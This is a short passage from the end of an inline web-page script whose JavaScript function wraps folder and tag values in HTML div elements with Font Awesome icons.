return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
